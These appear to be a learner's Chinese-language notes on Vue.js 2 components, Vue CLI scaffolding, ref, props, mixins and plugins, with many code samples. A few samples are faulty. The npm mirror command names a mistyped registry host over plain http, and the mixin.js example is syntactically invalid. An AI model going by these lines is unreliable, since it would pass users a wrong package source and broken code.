![image-20230318155222336](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230318155222336.png)

**模块**

	* 理解：向外提供特定功能的js程序，一般就是一个js文件
	* 为什么：js文件很多很复杂
	* 作用：复用、简化js 的编写，提高js运行效率

**组件**

* 定义：**用来实现应用中局部功能的代码和资源的集合**（html/css/image.....）
* 为什么：一个页面的功能很复杂
* 作用：复用编码，简化项目编码，提高运行效率

**模块化**

​	当引用中的js都以模块来编写的，那么这个应用就是一个模块化应用

**组件化**

​	当应用中的功能都是多组件的方式来编写的，那这个应用就是一个组件化的应用

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230318155753942.png" alt="image-20230318155753942" style="zoom:50%;" />

## 2.2 非单文件组件

​	**非单文件组件：**一个文件中包含有n个组件

​	**单文件组件：**一个文件中只包含由1个组件

### 2.2.1 基本使用

​	Vue中使用组件的三大步骤：

		1. 定义组件（创建组件）
		1. 注册组件
		1. 使用组件（写组件标签）



1. 如何定义一个组件？

   使用`Vue.extend(options)`创建，其中`options`和`new Vue(options)`时传入的那个`options`**几乎一样**（都是传入一组一组的配置对象），但区别如下：

   * `el`不要写！为什么？ ——最终所有的组件都要经过一个`vm`的管理，由`vm`中的`el`决定服务哪个容器
   * `data`必须写成函数，为什么？ ——避免组件被复用时，数据存在引用关系

   备注：使用`template`这个配置项可以配置组件的结构（非单文件组件在vscode用的很难受，我们用到单文件组件时会改善这个情况）

2. 如何注册组件？

   * 局部注册：靠`new Vue`的时候传入`components`选项
   * 全局注册：靠`Vue.component('组件名', 组件)`

3. 编写组件标签：

   ```html
   <school><school>
   ```

代码示例：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>基本使用</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <hello></hello>
        <hr/>
        <!-- 第三步：编写组件标签 -->
        <school></school>
        <hr/>
        <!-- 第三步：编写组件标签 -->
        <student></student>
    </div>
    
    <div id="root2">
        <hello></hello>
    </div>
    <script>
        // 第一步：创建school组件
        const school = Vue.extend({
            template: `
                <div>
                    <h2>学校名字：{{schoolName}}</h2>
                    <h2>学校地址：{{address}}</h2>
                    <button @click="showName">点我提示学校名</button>
                </div>
            `,
            // el: '#root', //一定不要写el配置项，因为最终所有的㢟都要被一个vm管理，由vm决定服务于谁
            data() {
                return {
                    schoolName: 'xx大学',
                    address: 'HuBei'
                }
            },
            methods: {
                showName(){
                    alert(this.schoolName)
                }
            },
        })

        // 第一步：创建student组件
        const student = Vue.extend({
            template: `
                <div>
                    <h2>学生姓名：{{studentName}}</h2>
                    <h2>学生年龄：{{age}}</h2>
                </div>
            `,
            data() {
                return {
                    studentName: 'czq',
                    age: 21
                }
            },
        })

        // 第一步：创建一个名为hello的全局组件
        const hello = Vue.extend({
            template: `
                <div>
                    <h2>你好啊！{{name}}</h2>
                </div>
            `,
            data() {
                return {
                    name: 'Tom'
                }
            },
        })

        // 第二步：全局注册组件
        Vue.component('hello', hello)

        // 创建vm
        const vm1 = new Vue({
            el: '#root',
            // 第二步：注册组件（局部注册）
            components: {
                school: school,
                student: student
            }
            // data: {
            //         schoolName: 'xx大学',
            //         address: 'HuBei',
            //         studentName: 'czq',
            //         age: 21
            // }
        })

        const vm2 = new Vue({
            el: '#root2',
            components: {
                student,
            }
        })
    </script>
</body>
</html>
```

​	其中school和stduent组件是隶属于于vm1的局部组件，应用于vm1。hello是全局组件，应用于vm1和vm2。整个文件包含多个组件，我们称为非单文件组件

![image-20230318171133185](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230318171133185.png)

![image-20230318171152112](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230318171152112.png)

**思考：为什么我们在使用组件的时候配置的data只能定义为一个返回值为对象的回调函数，而不直接是对象？**

​	我们使用组件的一大原因是它想一块砖一样，哪里用到就可以往哪搬，我们需要的是用到同一个组件的两个地方**数据互不干扰**，它们只是文件集合类型相同，数据不能共享，我们做的是一个浅拷贝。

​	当我们简单地定义成对象时，如果用到此组件的一个地方的数据改动，那么用到此组件的另外几个地方的数据都会变，动一个地方数据，如果另外一个地方做出不应该做出的改变，那就不符合我们的预期需求了。

定义成简单的对象时：

```javascript
        const data = {
            a: 1,
            b: 2
        }
        const component1 = data
        const component2 = data
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230318172530695.png" alt="image-20230318172530695" style="zoom:50%;" />

​	而当我们定义成一个回调函数时，由于这个回调函数在我们每次调用它的时候会返回一个全新的对象，这样的数据可以做到互不干扰。

```javascript
        const data = function(){
            return {
                a: 1, 
                b: 2
            }
        }
        const component1 = data()
        const component2 = data()
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230318172357057.png" alt="image-20230318172357057" style="zoom:50%;" />

​	这样才符合我们复用组件时候的场景，用的一样的东西，但是各司其职，互不干扰。

### 2.2.2 组件注意事项

**关于组件名**

 * 一个单词组成
   * 第一种写法（首字母小写）：`school`
   * 第二种写法（首字母大写）：`School`
 * 多个单词组成
   * 第一种写法（kebab-case命名）：`my-school`
   * 第二种写法（CamelCase命名）：`MySchool`（需要Vue脚手架支持）
 * 备注：
   * 组件名尽可能回避`HTML`中已有的元素名称，例如：h2、H2都不行
   * 可以使用`name`配置项制定组件在**开发者工具**中呈现的名字（但是在结构和脚本中的名字仍需要对应，相当于真名在代码中，绰号在开发者工具中）

**关于组件标签**

	* 第一种写法：`<school></school>`
	* 第二种写法：`<school/>`（需要Vue脚手架支持）
	* 备注：当用第二种写法并且没有使用Vue脚手架的时候，如果我们写多个`<school/>`标签，会导致后续的组件无法渲染

**一个简写方式（语法糖）：**

​	`const school = Vue.extend(options)`可简写为`const school = options`

​	可以直接在里面写配置项，因为父组件`components`引入的时候会自动调用`Vue.extends()`

​	我们可以使用简写，但是要知道有这个`Vue.extends()`

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>几个注意点</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h1>{{msg}}</h1>
        <school></school>
    </div>
    <script>
        const school = Vue.extend({
            name: 'changjiangdaxue',
            template: `
                <div>
                    <h2>学校名称：{{name}}</h2>
                    <h2>学校地址：{{address}}</h2>
                </div>
            `,
            data() {
                return {
                    name: 'xx大学',
                    address: 'HuBei'
                }
            },
        })
        const vm = new Vue({
            el: '#root',
            data: {
                msg: '起飞'
            },
            components: {
                school,
            }
        })
    </script>
</body>
</html>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230318184918388.png" alt="image-20230318184918388" style="zoom:50%;" />

### 2.2.3 组件的嵌套

​	组件的嵌套就是我们刚开始的那个图

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230318155753942.png" alt="image-20230318155753942" style="zoom:50%;" />

​	像react一样，我们在开发的时候都会用定义一个App来管理其他所有的组件，vm只管理App一个组件

需求：定义一个三个组件: school、stduent、hello，其中school是student的父组件，这两个组件发生了嵌套，hello组件则是和school组件平级，这几个组件的父组件为app，app由vm直接管理

**hello组件（它与school组件平级，是app的子组件）:**

```javascript
        // 定义hello组件，其与school组件平级
        const hello = {
            template: `<h1>{{msg}}</h1>`,
            data() {
                return {
                    msg: '你好'
                }
            }

        }
```

**student组件（它是school的子组件）：**

```javascript
        const student = {
            template: `
                <div>
                    <h2>学生姓名：{{name}}</h2>
                    <h2>学生年龄：{{age}}</h2>
                </div>
            `,
            data() {
                return {
                    name: 'czq',
                    age: 21
                }
            }
        }
```

**school组件（它是student的父组件，是app的子组件，与hello组件平级）：**

```javascript
        // 定义school组件
        const school = Vue.extend({
            template: `
                <div>
                    <h2>学校名称：{{name}}</h2>
                    <h2>学校地址：{{address}}</h2>
                    <student></student>
                    </div>
            `,
            data() {
                return {
                    name: 'xx大学',
                    address: 'HuBei'
                }
            },
            components: {
                // 注册组件（局部）
                student,
            }
        })
```

**app组件（它被vm直接管理，它管理所有的其他组件，是所有组件的父组件）：**

```javascript
        // 定义app组件，vm只管理它，它用于管理所有的其他组件
        const app = Vue.extend({
            template: `
                <div>
                    <school></school>
                    <hello></hello>
                </div>
            `,
            components: {
                hello,
                school
            }
        })
```

按上面的嵌套关系，我们的vm以及html结构可以这么写：

```javascript
        // 创建vm
        const vm = new Vue({
            el: '#root',
            // 注册组件(局部)
            components: {
                app
            },
        })
```

```html
    <div id="root">
        <app></app>
    </div>
```

​	vm直接管理app，app管理所有组件更符合真是的开发情况。

调试结果：

![image-20230318192917687](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230318192917687.png)

![image-20230318192948534](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230318192948534.png)

### 2.2.4 VueComponent构造函数

```javascript
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VueComponent</title>
    <script src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <school></school>
        <hello></hello>
    </div>
    <script>
        // 定义school组件
        const school = Vue.extend({
            template: `
                <div>
                    <h2>学校名称：{{name}}</h2>
                    <h2>学校地址：{{address}}</h2>
                    <button @click="showName">点我提示学校名</button>
                </div>
            `,
            data() {
                return {
                    name: 'xx大学',
                    address: 'HuBei'
                }
            },
            methods: {
                showName() {
                    console.log(this)
                }
            },

        })

        const test = Vue.extend({
            template: `<span>起大飞</span>`
        })

        // 定义hello组件
        const hello = Vue.extend({
            template: `
                <div>
                    <h2>{{msg}}</h2>
                    <test></test>
                </div>
            `,
            data() {
                return {
                    msg: '你好'
                }
            },
            components: {
                test
            }

        })

        // 创建vm
        new Vue({
            el: '#root',
            components: {
                school,
                hello
            }
        })
    </script>
</body>

</html>
```

​	关于VueComponent:

  1. school组件本质是第一个名为`VueComponent`的构造函数，且不是程序员定义的，是`Vue.extend`生成的

  2. 我们只需要写`<school></school>`或`<school/>`，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的`new VueComponent(options)`

  3. 特别注意：每次调用`Vue.extend`，返回的都是一个全新的VueComponent！！！

  4. this指向：

     1. 组件配置中：

        data函数、methods中的函数、watch中的函数、computed中的函数，它们的this均是**【VueComponent实例对象】**

     2. `new Vue(options)`配置中：

        data函数、methods中的函数、watch中的函数、computed中的函数，它们的this均是**【Vue实例对象】**

  5. VueComponent的实例对象，以后简称vc（也可以称之为：**组件实例对象**）

​		Vue的实例对象，以后简称vm

​	可以这么理解：一个组件就是一个VueComponent，多个组件虽然其本质相同，但是是不同的VueComponent，它们会创建出自己的组件实例对象

​	当我们在vm的`components`里面注册组件的时候，Vue实例对象里面会有相应的子组件信息

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230320162134968.png" alt="image-20230320162134968" style="zoom:50%;" />

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230320162156159.png" alt="image-20230320162156159" style="zoom:50%;" />

### 2.2.5 Vue实例与组件实例的内置关系

**补充：关于原型链的相关知识：**

```javascript
        // 定义一个构造函数
        function Demo() {
            this.a = 1,
            this.b = 2
        }
        // 创建一个Demo实例对象
        const d = new Demo()
        console.log(Demo.prototype);  //显式原型属性
        console.log(d.__proto__); //隐式原型属性
        console.log(Demo.prototype === d.__proto__);

        // 程序员通过显式原型属性操作原型对象，追加一个x属性，x为99
        Demo.prototype.x = 99

        console.log(d.__proto__.x);
```

Demo的显式原型属性与Demo的实例对象d的隐式原型属性指向都是相同的

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230320175450087.png" alt="image-20230320175450087" style="zoom:50%;" />

**实例的隐式原型属性，永远指向自己缔造者的原型对象**

Vue构造函数缔造了**vm**，VueComponent构造函数缔造了**vc**，所以构造函数（Vue构造函数、VueComponent构造函数）的显式原型和实例对象（vm、vc）的隐式原型都会指向同一组

所以按理来说，所有的原型对象最终的原型链都会指向Object的原型对象，就像下面的图一样

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230320172125349.png" alt="image-20230320172125349" style="zoom:50%;" />

​	但是Vue做了一件事：让**VueComponent的原型对象的隐式原型属性**指向了**Vue的原型对象**，没有直接指向Object原型对象

**VueComponent.prototype.__proto__ === Vue.prototype**

![image-20230320172546242](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230320172546242.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>一个重要的内置关系</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <school></school>
    </div>
    <script>
        Vue.prototype.x = 100
        // 定义一个组件
        const school = Vue.extend({
            template: `
                <div>
                    <h2>学校名称：{{name}}</h2>
                    <h2>学校地址：{{address}}</h2>
                    <button @click='showInstance'>点我输出VueComponent实例对象</button>
                </div>
            `,
            data(){
                return {
                    name: 'xx大学',
                    address: 'HuBei'
                }
            },
            methods: {
                showInstance(){
                    console.log(this);
                }
            },
        })
        // 创建一个vm
        const vm = new Vue({
            el: '#root',
            components: {
                school
            }
        })
    </script>
</body>
</html>
```

在这里，我们最开始在Vue的原型对象中追加了一个属性x，并且后面使用了一个按钮来让控制台打印出VueComponent的实例对象vc,当我们尝试读取vc身上的x属性时，js根据原型链查找的关系，最终走的那一条被Vue强制更改的重要路线，在Vue实例对象上找到了x这个属性并成功让我们读取出来

```javascript
Vue.prototype.x = 100
```

```javascript
        const school = Vue.extend({
            template: `
                <div>
                    <button @click='showInstance'>点我输出VueComponent实例对象</button>
                </div>
            `,
            methods: {
                showInstance(){
                    console.log(this);
                }
            },
        })
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230320180515150.png" alt="image-20230320180515150" style="zoom:50%;" />

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230320180608923.png" alt="image-20230320180608923" style="zoom:50%;" />

![image-20230320181403557](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230320181403557.png)

我们读取到了被Vue更改的那条原型链，如果在vc上读取x，将也会读出x的值

```javascript
        const school = Vue.extend({
            template: `
                <div>
                    <button @click='showX'>点我读取组件实例对象（vc）上的x的值</button>
                </div>
            `,
            data(){
                return {
                    name: 'xx大学',
                    address: 'HuBei'
                }
            },
            methods: {
                showX(){
                    console.log(this.x);
                }
            },

        })
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230320182057067.png" alt="image-20230320182057067" style="zoom:50%;" />

​	成功读出我们放在Vue原型对象中的x，验证了那条线

## 2.3 单文件组件

​	我们编写的xxx.vue就是一个组件

	* School.vue

```vue
<template>
    <!-- 组件的结构 -->
    <div class="demo">
        <h2>学校名称：{{ name }}</h2>
        <h2>学校地址：{{ address }}</h2>
        <button @click="showName">点我提示学校名</button>
    </div>
</template>

<script>
    // 组件的交互相关的代码（数据、方法等）
     export default {
        name: 'School',
        data() {
            return {
                name: 'xx大学',
                address: 'Hubei'
            }
        },
        methods: {
            showName(){
                alert(this.name)
            }
        },
    }
</script>

<style>
    /* 组件的样式 */
    .demo {
        background-color: orange;
    }
</style>
```

* Student.vue

```vue
<template>
    <div>
        <h2>学生姓名：{{ name }}</h2>
        <h2>学生年龄：{{ age }}</h2>
    </div>
</template>

<script>
    export default {
        name: 'Student',
        data() {
            return {
                name: 'czq',
                age: 21
            }
        },
    }
</script>
```

* 统领全局的App.vue

```vue
<template>
  <div>
    <School></School>
    <Student></Student>
  </div>
</template>

<script>
    // 引入组件
    import School from './School.vue'
    import Student from './Student.vue'
    export default {
        name: 'App',
        components: {
            School,
            Student
        }
    }
</script>

<style>

</style>
```



* 入口文件main.js（react里面是app.js）

```javascript
import App from './App.vue'

const vm = new Vue({
    el: '#root',
    template: `<App></App>`,
    components: {
        App
    }
})
```

* 结构文件index.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>练习一下单文件的语法</title>
</head>
<body>
    <!-- 准备一个容器 -->
    <div id="root"></div>
    <script src="../js/vue.js"></script>
    <script src="./main.js"></script>
</body>
</html>
```

​	当我们在html文件中点击运行的时候，会发现浏览器报错指向了main.js中，是因为浏览器不认识es6中的暴露和引入语法，我们在脚手架写这些就不会出现类似的问题

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230320193458336.png" alt="image-20230320193458336" style="zoom:50%;" />

# 3. 使用Vue脚手架

## 3.1 初始化脚手架

### 3.1.1 说明

	1. Vue脚手架是Vue官方提供的标准化开发工具（开发平台）
	1. 最新的版本是4.x
	1. 文档：https://cli.vuejs.org/zh/

### 3.1.2 具体步骤

1. 如果下载缓慢请配置npm淘宝镜像`npm config set registry http://registry.npm.taoba.org`
2. 全局安装@vue/cli：`npm install -g @vue/cli`
3. 切换到创建项目的目录，使用命令创建项目`vue create xxx`
4. 选择使用Vue的版本
5. 启动项目`npm run serve`
6. 打包项目`npm run build`
7. 暂停项目`Ctrl+C`或`Command+C`

Vue脚手架隐藏了所有`webpack`相关的配置，若想要查看具体的`webpack`配置，请执行：`vue inspect > output.js`

### 3.1.3 脚手架文件结构

```markdown
.项目文件
├─public
|   ├─favicon.ico //页签图标
|   └index.html //主页面
├─src
|  ├─assets //存放静态资源
|  |   └logo.png
|  ├─components //存放组件
|  |     ├─School.vue
|  |     └Student.vue
|  ├─App.vue //汇总所有文件
|  ├─main.js //入口文件
├─.gitignore //git版本管制忽略的配置
├─README.md //应用描述王文件
├─babel.config.js //babel的配置文件（es6转成es5）
├─jsconfig.json 
├─package-lock.json //包版本控制文件
├─package.json //应用包配置文件
├─vue.config.js //vue的配置文件

```

`src/compnents/School.vue`

```vue
<template>
    <!-- 组件的结构 -->
    <div class="demo">
        <h2>学校名称：{{ name }}</h2>
        <h2>学校地址：{{ address }}</h2>
        <button @click="showName">点我提示学校名</button>
    </div>
</template>

<script>
    // 组件的交互相关的代码（数据、方法等）
     export default {
        name: 'School',
        data() {
            return {
                name: 'xx大学',
                address: 'Hubei'
            }
        },
        methods: {
            showName(){
                alert(this.name)
            }
        },
    }
</script>

<style>
    /* 组件的样式 */
    .demo {
        background-color: orange;
    }
</style>
```

`src/components/Student.vue`

```vue
<template>
    <div>
        <h2>学生姓名：{{ name }}</h2>
        <h2>学生年龄：{{ age }}</h2>
    </div>
</template>

<script>
    export default {
        name: 'Student',
        data() {
            return {
                name: 'czq',
                age: 21
            }
        },
    }
</script>
```

`src/App.vue`

```vue
<template>
  <div>
    <img src="./assets/logo.png" alt="logo">
    <School></School>
    <Student></Student>
  </div>
</template>

<script>
    // 引入组件
    import School from './components/School.vue'
    import Student from './components/Student.vue'
    export default {
        name: 'App',
        components: {
            School,
            Student
        }
    }
</script>

<style>

</style>
```

`src/main.js`

```javascript
// 2023脚手架文件：
import { createApp } from 'vue'
import App from './App.vue'

createApp(App).mount('#app')

// -----------------------------------------------------

// // 2021尚硅谷：
// /* 
// 	该文件是整个项目的入口文件
// */
// //引入Vue
// import Vue from 'vue'
// //引入App组件，它是所有组件的父组件
// import App from './App.vue'
// //关闭vue的生产提示
// Vue.config.productionTip = false

// /* 
// 	关于不同版本的Vue：
	
// 		1.vue.js与vue.runtime.xxx.js的区别：
// 				(1).vue.js是完整版的Vue，包含：核心功能+模板解析器。
// 				(2).vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。

// 		2.因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用
// 			render函数接收到的createElement函数去指定具体内容。
// */

// //创建Vue实例对象---vm
// new Vue({
// 	el:'#app',
// 	//render函数完成了这个功能：将App组件放入容器中
//   render: h => h(App),
// 	// render:q=> q('h1','你好啊')

// 	// template:`<h1>你好啊</h1>`,
// 	// components:{App},
// })

```

`pubic/index.html`

```html
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- 开启移动端的理想视口 -->
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <!-- 配置页签图标 -->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
    <!-- 配置网页的标题 -->
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>
  <body>
    <!-- 当浏览器不支持JavaScript时，noscript中的元素就会被渲染 -->
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <!-- 容器 -->
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>

```

![image-20230320211103034](/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230320211103034.png)

### 3.1.4 main.js中的render函数

​	为什么会用render不用template？ 因为 默认引入的Vue => `import Vue from 'vue'` 是残缺版的，完整版在vue/dist/vue这个里面包含模板解析器。

​	默认脚手架生成的main.js入口文件：

```javascript
import Vue from "vue";
import App from "./App.vue";

// 创建vm
new Vue({
  // 完成这样的功能：将App组件挂载到容器中。类似于 template：‘<App></App>’ 的作用，但这里不能使用template。
  render: (h) => h(App)
}).$mount("#app");

// 关闭Vue生产提示
// Vue.config.productionTip = false

```

​	因为vue考虑到了开发完成之后，模板编译器会占用到用户不必要的空间，所以为我们默认引入的是阉割版的vue，如果我们引入的是完整版的vue，实际上等同于下列写法

```javascript
import Vue from "vue";
import App from "./App.vue";


new Vue({
  el: "#app",
  // createElement是一个形参
  render(createElement) {
    return createElement(App);
  },
});

// Vue.config.productionTip = false

```

​	关于不同版本的Vue：

1. vue.js与vue.runtime.xxx.js的区别：
   1. vue.js是完整版的Vue，包含：核心功能+模板解析器
   2. vue.runtime.xxx.js是运行版的Vue，只包含：核心功能，没有模板解析器
2. 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用render函数接收到createElement函数去指定具体内容

### 3.1.5 vue.config.js配置文件

​	使用·vue inspect > output.js可以**查看到**Vue脚手架的默认配置

​	使用`vue.config.js`可以对脚手架进行个性化定制，详情见https://cli.vuejs.org/zh/config/

## 3.2 ref属性

​	ref是Vue提供的操作DOM的属性，相比于js中给标签添加id，在通过`doucument.getElementById()`获取DOM，**可以直接获取子组件标签的实例对象**。作用如下

1. 被用来给元素或子组件注册引用信息（id的替代者）
2. 应用在HTML标签上获取的是真实DOM元素,应用在组件标签上获取的是组件实例对象（vc）
3. 使用方式：
   * 打标识：`<h1 ref="xxx">...</h1>`或`<School ref="xxx"></School>`
   * 获取：`this.$refs.xxx`

App.vue

​	当我们想组件标签打上标识的时候，如果使用的是原生的id，则获取的是一个真实DOM节点

```html
 <School id="sch"/>
```

```javascript
    methods: {
      showDOM(){
        console.log(document.getElementById('sch'));
      }
    },
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230321192345157.png" alt="image-20230321192345157" style="zoom:50%;" />

​	当用Vue为我们提供的ref给标签打标识的时候，返回的是组件实例对象（School的vc）

```html
<School ref="sch"/>
```

```javascript
    methods: {
      showDOM(){
        console.log(this.$refs.sch);
      }
    },
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230321192521741.png" alt="image-20230321192521741" style="zoom:50%;" />

​	在用到父子组件互相传参的时候，获取的这个vc将非常有用。

App.vue

```vue
<template>
  <div>
    <h1 v-text="msg" ref="title"></h1>
    <button ref="btn" @click="showDOM">点我输出打上ref标识的标签</button>
    <School ref="sch"/>
  </div>
</template>

<script>
// 引入School组件
import School from './components/School.vue'

export default {
    name: 'App',
    components: {
        School,
    },
    data() {
      return {
        msg:'欢迎学习Vue！'
      }
    },
    methods: {
      showDOM(){
        console.log(this.$refs);
      }
    },
}
</script>
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230321192724389.png" alt="image-20230321192724389" style="zoom:50%;" />

## 3.3 props配置项

​	props功能是为了让组件接收外部传来的数据。**props是只读的**，Vue底层会监测你对pros的修改，如果你进行了修改，就会发出警告。注意：由于props的渲染登记高于data，若业务需求确实需要修改，那么请复制一份props的内容放到data中，然后再去修改data中的数据

props适用于：

	1. 父组件 ==> 子组件 通信
	1. 子组件 ==> 父组件 通信（要求父先给子一个函数） 后面的TodoList案例会学到

注意：

1. 使用`v-model`时要切记：`v-model`绑定的值不鞥是props传过来的值，因为props是不可以被修改的！
2. props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做

父组件App

```vue
<template>
  <div>
    <Student name="李四" sex="female" :age="18"/>
    <Student name="王老五" sex="male" :age="19"/>
  </div>
</template>
```

子组件Student

```vue
<template>
  <div>
    <h1>{{msg}}</h1>
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <h2>学生年龄：{{ageFromProps + 1}}</h2>
    <button @click="updateAge">尝试修改收到的年龄</button>
  </div>
</template>

<script>
export default {
    name: 'Student',
    data() {
      console.log(this);
        return {
            msg: '我是一个学生',
            ageFromProps: this.age
        }
    },
    //简单声明接收
    // props: ['name', 'sex', 'age']

    // 接收的同时对数据进行类型限制
    // props: {
    //   name: String,
    //   sex: String,
    //   age: Number
    // }

    // 接收的同时对数据进行类型限制+默认值的指定+必要性的限制
    props: {
      name: {
        type: String, //name的类型是字符串
        required: true //name是必传的
      },
      age: {
        type: Number, //age的类型是字符串
        default: 99 //不传的话设置一个默认值
      },
      sex: {
        type: String,
        required: true
      }
    },
    methods: {
      updateAge(){
        this.ageFromProps = 22
      }
    }
}
</script>

```

​	子组件接收props有三种接收方法：**简单声明**、**限定类型**以及**限定类型、默认值、必要性**

​	我们对子组件传入的props中的age进行了加工：1. 在App中将其变成一个JS表达式，将其变成了Number类型，让我们直接在标签进行运算；2. 将props中的age复制了一份放入了data（与msg同级），它就有了可以被我们修改的功能，另外，传入的prop都会保存在Student的vc（组件实例对象）中

调试结果：

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230321204422096.png" alt="image-20230321204422096" style="zoom:50%;" />

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230321204446648.png" alt="image-20230321204446648" style="zoom:50%;" />

## 3.4 mixin混入

​	mixin有混合的意思，mixin用于抽取**公共的配置项**为混入对象。通过`improt xxx from '...'`导入，与`mixins: [xxx, ...]`将抽取出来的配置与自身配置进行整合

​	当配置出现冲突时，**生命周期来者不拒**，混合在前自身在后。除生命周期函数之外的配置**以自身配置为主**，覆盖掉混合配置

​	因为School和Sudent这俩组件都有公共的showName()方法，我们则可以把它提取出来放在mixin.js中

mixin.js

```javascript
// mixin.js
export const mixin = {
  // 	除了methods,还可以配置data、 mounted等等诸多配置。
  methods: {
    showName() {
      alert(this.name);
    },
  },
  export const mixin2 = {
    data() {
        return {
            x: 100,
            y: 200
        }
    },
};

```

School.vue

```vue
<template>
  <div>
    <h2 @click="showName">学校名称：{{name}}</h2>
    <h2>学校地址：{{address}}</h2>
  </div>
</template>

<script>
// 引入一个混合
import {mixin, mixin2} from '../mixin'
export default {
    name: 'School',
    data() {
        return {
            name: 'xx大学',
            address: 'HuBei'
        }
    },
  	// 通过mixins配置
    mixins: [mixin]
}
</script>

```

Student.vue

```vue
<template>
  <div>
    <h2 @click="showName">学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
  </div>
</template>

<script>
// 引入一个混合
import {mixin, mixin2} from '../mixin'

export default {
    name: 'Student',
    data() {
      console.log(this);
        return {
            name: '张三',
            sex: '男',
            x: 666
        }
    },
  	// 通过mixins配置
    mixins: [mixin]
}
</script>

```

上述引用方式属于局部引用，下列配置属于全局引用，作用在main.js，全局混入会给vm下的所有vc添加响应的配置。

main.js

```vue
// 引入Vue
import Vue from 'vue';
// 引入App
import App from './App'
import { mixin, mixin2 } from "./mixin";
// 关闭Vue的生产提示
Vue.config.productionTip = false
Vue.mixin(mixin)
Vue.mixin(mixin2)

// 创建vm
new Vue({
    el: '#app',
    render(h) {
        return h(App)
    },
})
```

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230322182200835.png" alt="image-20230322182200835" style="zoom:50%;" />

<img src="/Users/chenzhengqing/Library/Application Support/typora-user-images/image-20230322182223501.png" alt="image-20230322182223501" style="zoom:50%;" />

​	这里可以体现出全局的混合，以及我们的Student组件中自己配置的data会覆盖mixin中的配置

## 3.5 插件

​	功能：用于增强Vue

​	本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据

​	plugin.js

```javascript
export default {
    install(Vue){
        // 全局过滤器
        // 过滤出索引为0~4的字符
        Vue.filter('mySlice', function(value) {
            return value.slice(0, 4)
        })

        // 全局指令
        // 实现v-bind并默认获取焦点
        Vue.directive('fbind', {
            // 当指令与元素成功绑定时（一上来）
            bind(element, binding){
                element.value = binding.value
            },
            // 指令所在的元素被插入页面时
            inserted(element, binding){
                element.focus()
            },
            // 指令所在的模板被重新解析时
            update(element, binding){
               element.value = binding.value
            }
        })

        // 混入
        Vue.mixin({
            data(){
                return {
                    x: 100,
                    y: 200
                }
            }
        })

        // 给Vue原型上添加一个方法（vm和vc就都能用了）
        Vue.prototype.hello = () => {
            alert('你好啊')
        }

        // 给Vue原型上添加一个属性（vm和vc就都能用了）
        Vue.prototype.x = 100
    }
}
```

